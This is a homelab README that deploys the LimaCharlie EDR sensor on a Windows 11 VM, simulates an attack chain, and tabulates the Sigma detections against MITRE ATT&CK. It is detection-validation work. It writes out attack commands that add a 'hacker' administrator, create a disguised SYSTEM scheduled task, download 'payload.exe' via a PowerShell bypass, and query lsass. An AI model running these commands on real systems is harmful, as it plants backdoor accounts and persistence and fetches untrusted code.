# EDR-limacharlie-homelab

LimaCharlie EDR deployment, attack simulation & threat detection on Windows 11 Pro — full attack chain across Discovery, Persistence, Credential Access and C2 using Sigma rules in a Wazuh + Nessus home lab environment.

---

## Lab Environment

| VM | IP | Role |
|---|---|---|
| Kali Linux | 10.0.2.5 | Wazuh Manager 4.7.5 (Indexer + Manager + Dashboard) |
| Windows Server 2019 | 10.0.2.15 | Wazuh Agent + Sysmon + Nessus Essentials Scanner |
| Windows 11 Pro | 10.0.2.122 | Wazuh Agent + Sysmon + LimaCharlie EDR Sensor |

All VMs run on Oracle VirtualBox on NAT Network LabNetwork (10.0.2.0/24).

---

## What is LimaCharlie?

LimaCharlie is a cloud-native Security Operations Platform providing real-time EDR capabilities. It gives analysts full visibility into endpoint telemetry including process creation, network connections, file system activity, and registry changes streamed in real time to a cloud console.

---

## Lab Objectives

- Deploy the LimaCharlie sensor on a live Windows 11 Pro endpoint
- - Enable Sigma-based detection rulesets (ext-sigma)
  - - Simulate a realistic multi-stage attack chain
    - - Generate and analyse detections mapped to MITRE ATT&CK
      - - Validate EDR telemetry alongside existing Wazuh SIEM coverage
       
        - ---

        ## Deployment

        ### Step 1 - Create LimaCharlie Organisation
        - Signed up at app.limacharlie.io
        - - Created organisation: GK-SOC-Homelab (Region: Canada)
         
          - ### Step 2 - Generate Installation Key
          - - Navigated to Sensors > Installation Keys
            - - Created key: Win11-Pro-10.0.2.122
             
              - ### Step 3 - Install Sensor on Windows 11 Pro
             
              - ```cmd
                cd C:\Users\admin\Downloads
                hcp_win_x64.exe -i <INSTALLATION_KEY>
                ```

                ### Step 4 - Verify Deployment
                Confirmed win11-endpoint appeared in LimaCharlie Sensors List with green Online status within 60 seconds.

                ### Step 5 - Enable Detection Rules
                - Subscribed to ext-sigma: Core Sigma rules (MITRE ATT&CK mapped, free)
               
                - ---

                ## Attack Simulation & Detections

                ### Phase 1 - Discovery (TA0007)

                ```cmd
                whoami /all & net user & net localgroup administrators
                ```

                | Detection | MITRE Technique |
                |---|---|
                | Suspicious Group And Account Reconnaissance Activity Using Net.EXE | T1069 |
                | Local Accounts Discovery | T1087.001 |
                | Enumerate All Information With Whoami.EXE | T1033 |

                ---

                ### Phase 2 - Persistence (TA0003)

                ```cmd
                net user hacker P@ssword123 /add & net localgroup administrators hacker /add
                schtasks /create /tn "WindowsUpdate" /tr "cmd.exe /c whoami" /sc onlogon /ru system
                ```

                | Detection | MITRE Technique |
                |---|---|
                | New User Created Via Net.EXE | T1136.001 |
                | User Added to Local Administrators Group | T1098 |
                | Scheduled Task Creation Via Schtasks.EXE | T1053.005 |
                | Suspicious Schtasks Schedule Type With High Privileges | T1053.005 |

                ---

                ### Phase 3 - Command and Control (TA0011)

                ```powershell
                powershell -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri http://example.com -OutFile C:\Temp\payload.exe"
                ```

                | Detection | MITRE Technique |
                |---|---|
                | 00048-WIN-Powershell_Invoke-WebRequest_Usage | T1105 |
                | Usage Of Web Request Commands And Cmdlets | T1105 |
                | Change PowerShell Policies to an Insecure Level | T1059.001 |
                | Suspicious Invoke-WebRequest Execution | T1105 |
                | Non Interactive PowerShell Process Spawned | T1059.001 |

                ---

                ### Phase 4 - Credential Access (TA0006)

                ```powershell
                powershell -nop -exec bypass -c "Get-Process lsass"
                ```

                | Detection | MITRE Technique |
                |---|---|
                | PowerShell Get-Process LSASS | T1003.001 |
                | Suspicious PowerShell Parameter Substring | T1059.001 |
                | Non Interactive PowerShell Process Spawned | T1059.001 |

                ---

                ## MITRE ATT&CK Coverage Summary

                | Tactic | Technique | ID |
                |---|---|---|
                | Discovery | Account Discovery: Local Account | T1087.001 |
                | Discovery | System Owner/User Discovery | T1033 |
                | Discovery | Permission Groups Discovery | T1069 |
                | Persistence | Create Account: Local Account | T1136.001 |
                | Persistence | Account Manipulation | T1098 |
                | Persistence | Scheduled Task/Job | T1053.005 |
                | Command and Control | Ingress Tool Transfer | T1105 |
                | Execution | PowerShell | T1059.001 |
                | Credential Access | OS Credential Dumping: LSASS Memory | T1003.001 |

                ---

                ## Cleanup

                ```cmd
                net user hacker /delete & schtasks /delete /tn "WindowsUpdate" /f
                ```

                ---

                ## Key Takeaways

                - LimaCharlie with Sigma rules detected every simulated attack technique across all 4 MITRE tactics
                - - EDR telemetry provides process-level detail that SIEM log collection alone cannot capture
                  - - The free ext-sigma ruleset provides enterprise-grade detection coverage at zero cost
                    - - Running EDR alongside Wazuh SIEM on the same endpoint demonstrates realistic multi-tool SOC visibility
                     
                      - ---

                      ## Related Labs

                      - [Wazuh SIEM Lab](https://github.com/gaurav-koshti-CySA/Wazuh_SIEM_Lab)
                      - - [Nessus Vulnerability Management Lab](https://github.com/gaurav-koshti-CySA/Nessus_Vuln_Management_Lab)
                        - - [Incident Response Lab](https://github.com/gaurav-koshti-CySA/-Incident-Response-lab)
                          - - [Entra IAM Lab](https://github.com/gaurav-koshti-CySA/Entra_Iam_Lab)
